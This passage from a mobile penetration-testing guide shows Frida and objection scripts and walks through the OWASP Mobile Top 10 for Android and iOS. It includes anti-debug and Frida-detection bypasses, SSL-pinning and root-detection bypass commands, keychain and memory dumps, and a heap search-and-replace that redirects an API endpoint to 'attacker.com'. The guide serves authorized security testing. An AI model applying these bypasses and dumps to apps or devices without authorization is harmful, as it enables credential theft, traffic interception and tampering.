    // Hook startActivity
    Activity.startActivity.overload('android.content.Intent').implementation = function(intent) {
        console.log('[startActivity] Intent: ' + intent);
        console.log('[startActivity] Action: ' + intent.getAction());
        console.log('[startActivity] Data: ' + intent.getData());
        console.log('[startActivity] Extras: ' + intent.getExtras());
        this.startActivity(intent);
    };
    
    // Hook Intent construction
    Intent.$init.overload('java.lang.String', 'android.net.Uri').implementation = function(action, uri) {
        console.log('[Intent] Action: ' + action);
        console.log('[Intent] URI: ' + uri);
        this.$init(action, uri);
    };
});
```

### iOS IPC Security

**URL Scheme Analysis**:
```bash
# Find registered URL schemes
# In Info.plist: CFBundleURLTypes

# Test URL scheme
# Using SpringBoard or Frida

# iOS URL scheme testing with Frida
```javascript
// url_scheme_hook.js
if (ObjC.available) {
    var UIApplication = ObjC.classes.UIApplication;
    
    // Hook openURL
    var openURL = UIApplication['- openURL:'];
    Interceptor.attach(openURL.implementation, {
        onEnter: function(args) {
            var url = ObjC.Object(args[2]);
            console.log('[openURL] URL: ' + url.absoluteString());
        }
    });
    
    // Hook canOpenURL
    var canOpenURL = UIApplication['- canOpenURL:'];
    Interceptor.attach(canOpenURL.implementation, {
        onEnter: function(args) {
            var url = ObjC.Object(args[2]);
            console.log('[canOpenURL] URL: ' + url.absoluteString());
        }
    });
}
```

**Universal Links Testing**:
```bash
# Universal Links use associated domains
# Check entitlements: com.apple.developer.associated-domains

# Test universal link handling
# Ensure proper validation of incoming URLs
```

---

## Runtime Manipulation with Frida

Frida is a powerful dynamic instrumentation toolkit that enables runtime code injection and manipulation on mobile platforms.

### Frida Installation and Setup

```bash
# Install Frida on host
pip3 install frida-tools

# Android setup
adb push frida-server /data/local/tmp/
adb shell chmod 755 /data/local/tmp/frida-server
adb shell /data/local/tmp/frida-server &

# iOS setup (jailbroken)
# Install Frida package via Cydia

# Verify connection
frida-ps -U  # USB device
frida-ps -R  # Remote device
```

### Advanced Frida Techniques

**Method Tracing**:
```javascript
// trace_methods.js
Java.perform(function() {
    // Trace all methods in a class
    var targetClass = Java.use('com.target.app.CryptoManager');
    var methods = targetClass.class.getDeclaredMethods();
    
    methods.forEach(function(method) {
        var methodName = method.getName();
        var overloads = targetClass[methodName].overloads;
        
        overloads.forEach(function(overload) {
            overload.implementation = function() {
                console.log('[TRACE] ' + methodName + ' called');
                console.log('[TRACE] Arguments: ' + JSON.stringify(arguments));
                
                var result = this[methodName].apply(this, arguments);
                
                console.log('[TRACE] Result: ' + result);
                return result;
            };
        });
    });
});
```

**Native Function Hooking**:
```javascript
// native_hook.js
Interceptor.attach(Module.findExportByName('libtarget.so', 'encrypt_data'), {
    onEnter: function(args) {
        console.log('[encrypt_data] Called');
        console.log('[encrypt_data] Arg0: ' + Memory.readUtf8String(args[0]));
        console.log('[encrypt_data] Arg1 length: ' + args[1].toInt32());
    },
    onLeave: function(retval) {
        console.log('[encrypt_data] Return value: ' + retval);
    }
});

// Hook libc functions
Interceptor.attach(Module.findExportByName('libc.so', 'open'), {
    onEnter: function(args) {
        var path = Memory.readUtf8String(args[0]);
        if (path.indexOf('secret') !== -1 || path.indexOf('key') !== -1) {
            console.log('[open] Accessing: ' + path);
        }
    }
});
```

**Heap Search and Modification**:
```javascript
// heap_search.js
// Search for strings in memory and modify them

function searchAndReplace(pattern, replacement) {
    var ranges = Process.enumerateRanges({protection: 'rw-'});
    
    ranges.forEach(function(range) {
        Memory.scan(range.base, range.size, pattern, {
            onMatch: function(addr, size) {
                console.log('[+] Pattern found at: ' + addr);
                Memory.writeUtf8String(addr, replacement);
                console.log('[+] Replaced with: ' + replacement);
            },
            onComplete: function() {}
        });
    });
}

// Replace API endpoint
searchAndReplace('api.target.com', 'attacker.com\x00');
```

**Anti-Debug Bypass**:
```javascript
// anti_debug_bypass.js
Java.perform(function() {
    // Bypass isDebuggerConnected
    var Debug = Java.use('android.os.Debug');
    Debug.isDebuggerConnected.implementation = function() {
        console.log('[*] isDebuggerConnected() bypassed');
        return false;
    };
    
    // Bypass ptrace checks
    var ptrace = Module.findExportByName(null, 'ptrace');
    Interceptor.replace(ptrace, new NativeCallback(function(request, pid, addr, data) {
        if (request === 0) {  // PTRACE_TRACEME
            console.log('[*] PTRACE_TRACEME blocked');
            return 0;
        }
        return -1;
    }, 'long', ['int', 'int', 'pointer', 'pointer']));
    
    // Bypass frida detection
    var File = Java.use('java.io.File');
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        if (path.indexOf('frida') !== -1 || path.indexOf('gadget') !== -1) {
            console.log('[*] Hiding Frida file: ' + path);
            return false;
        }
        return this.exists();
    };
});
```

### objection for Rapid Testing

**Common objection Commands**:
```bash
# Start objection shell
objection --gadget com.target.app explore

# Root/Jailbreak detection bypass
android root disable
ios jailbreak disable

# SSL pinning bypass
android sslpinning disable
ios sslpinning disable

# Screenshot and keyboard restriction bypass
android ui screenshot_mode  # Bypass FLAG_SECURE
ios ui screenshot  # iOS screenshot bypass

# Dump keychain (iOS)
ios keychain dump
ios keychain dump --json keychain.json

# Dump NSUserDefaults (iOS)
ios plist cat NSUserDefaults

# SQLite interaction
sqlite connect app.db
sqlite execute "SELECT * FROM users"

# Memory operations
memory list modules
memory dump all /tmp/memory.dump
memory search "password" --string

# Hooking
android hooking list activities
android hooking list services
android hooking search classes Crypto
android hooking search methods Crypto encrypt
android hooking set return_value com.target.app.RootDetector.isRooted false
```

---

## OWASP Mobile Top 10

The OWASP Mobile Security Project identifies the most critical risks to mobile applications. Understanding these vulnerabilities is essential for comprehensive mobile security testing.

### M1: Improper Platform Usage

**Testing Focus**:
- Misuse of platform features (intents, app permissions, TouchID/FaceID)
- Failure to use platform security controls
- Improper use of iOS Keychain or Android Keystore

**Test Cases**:
```bash
# Check for insecure TouchID/FaceID implementation
# Look for fallback to password without proper validation

# Check Keychain/Keystore usage
# Ensure proper protection attributes (kSecAttrAccessibleWhenUnlocked)

# Verify proper permission usage
# Apps should use minimal required permissions
```

### M2: Insecure Data Storage

**Testing Focus**:
- Storing sensitive data in unencrypted form
- Using weak encryption or hardcoded keys
- Logging sensitive information
- Insecure backup handling

**Automated Testing**:
```bash
# MobSF storage analysis
# Check for:
# - Unencrypted SQLite databases
# - Cleartext SharedPreferences
# - Sensitive data in logs
# - Insecure backups

# Manual verification
adb shell "run-as com.target.app find . -name '*.db' -o -name '*.xml'" | xargs adb shell "run-as com.target.app cat"
```

### M3: Insecure Communication

**Testing Focus**:
- Cleartext HTTP traffic
- Weak TLS/SSL configuration
- Improper certificate validation
- Missing certificate pinning

**Testing Commands**:
```bash
# Check for cleartext traffic
# Look for android:usesCleartextTraffic="true"
# Check NSAllowsArbitraryLoads in Info.plist

# Verify certificate validation
# Attempt MITM with self-signed certificate

# Test certificate pinning bypass
# If traffic still flows with invalid cert, pinning is missing or bypassed
```

### M4: Insecure Authentication

**Testing Focus**:
- Weak authentication schemes
- Client-side authentication decisions
- Hardcoded credentials
- Session token vulnerabilities

**Test Cases**:
```bash
# Check for hardcoded credentials
strings app.apk | grep -i "password\|secret\|admin"

# Analyze authentication flow
# Ensure server validates all authentication decisions

# Check session handling
# Look for predictable session tokens
# Test for session fixation vulnerabilities
```

### M5: Insufficient Cryptography

**Testing Focus**:
- Use of weak cryptographic algorithms (DES, MD5, SHA1)
- Hardcoded cryptographic keys
- Improper implementation of cryptography
- ECB mode usage

**Code Review**:
```java
// Look for these patterns:
Cipher.getInstance("DES");  // Weak algorithm
Cipher.getInstance("AES/ECB/PKCS5Padding");  // ECB mode
MessageDigest.getInstance("MD5");  // Weak hash

// Hardcoded keys
private static final String KEY = "hardcoded";
```

### M6: Insecure Authorization

**Testing Focus**:
- Client-side authorization decisions
- Privilege escalation vulnerabilities
- Insecure direct object references
- Hidden functionality exposure

**Testing Approach**:
```bash
# Access hidden endpoints
# Enumerate all activities/services
adb shell "run-as com.target.app dumpsys activity | grep -i activity"

# Test for direct object references
# Modify IDs in API requests to access other users' data
```

### M7: Client Code Quality

**Testing Focus**:
- Buffer overflows in native code
- Format string vulnerabilities
- Code injection through JavaScript bridges
- Memory leaks and crashes

### M8: Code Tampering

**Testing Focus**:
- Lack of root/jailbreak detection
- Absence of anti-tampering measures
- Code signing verification
- Resource modification

**Testing**:
```bash
# Check for root detection effectiveness
# Test with Magisk Hide, Zygisk

# Modify app behavior
# Repackage and resign app
apktool d app.apk
# Modify smali code
apktool b app -o modified.apk
jarsigner -keystore my.keystore modified.apk alias

# Install and test
adb install modified.apk
```

### M9: Reverse Engineering

**Testing Focus**:
- Lack of code obfuscation
- Debugging symbols in release builds
- Easy-to-understand code structure
- Absence of anti-debugging measures

**Countermeasure Testing**:
```bash
# Check for obfuscation
# ProGuard/R8 mapping files
jadx app.apk
# Look for readable class/method names

# Check for debug symbols
# Native libraries should be stripped
file libnative.so
nm libnative.so | head
```

### M10: Extraneous Functionality

**Testing Focus**:
- Hidden backdoors
- Debug/test code in production
- Admin interfaces
- Insecure logging

**Testing**:
```bash
# Search for test endpoints
strings app.apk | grep -i "test\|debug\|dev\|staging"

# Check for admin panels
# Hidden URLs or deep links

# Review log statements
# Look for Log.d, NSLog statements in production code
```

### OWASP MASVS (Mobile Application Security Verification Standard)

The MASVS provides a framework for mobile app security testing:

**MASVS-L1: Standard Security**:
- Best practices for mobile app security
- Resistant against common threats

**MASVS-L2: Defense-in-Depth**:
- Additional security controls
- Suitable for apps handling sensitive data

**MASVS-R: Resiliency**:
- Protection against reverse engineering
- Anti-tampering and anti-debugging

**Testing Alignment**:
```bash
# Map findings to MASVS requirements
# Generate compliance reports
# Use OWASP MAS Checklist

# Reference: https://mas.owasp.org/
```

This comprehensive guide to mobile application security testing provides penetration testers with the methodologies, tools, and techniques necessary to thoroughly assess Android and iOS applications. The rapidly evolving mobile landscape requires continuous learning and adaptation to new platforms, frameworks, and attack vectors.
